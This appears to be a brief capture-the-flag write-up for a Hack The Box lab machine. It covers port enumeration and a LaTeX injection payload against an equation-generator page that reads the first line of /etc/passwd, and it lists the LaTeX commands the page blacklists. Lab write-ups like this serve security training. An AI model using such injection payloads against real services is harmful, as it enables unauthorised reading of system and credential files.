#### Enumeration

Nmap reveals a open port 80. Which leads to this website:![[Pasted image 20230622165521.png]]
The only link that redirects us to another page is the LaTeX Equation Generator link. http://latex.topology.htb/equation.php (Might need to add this domain to /etc/hosts)

`sudo -- sh -c "echo '10.10.11.217 latex.topology.htb' >> /etc/hosts"`

This page executes Latex code for us. I used this injection 
```
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```
which allowed me to see the first line of the /etc/passwd file

When doing \\write, \\input, \\usepackage, \\immediate, \\url, \\href it seems to be blacklisted.
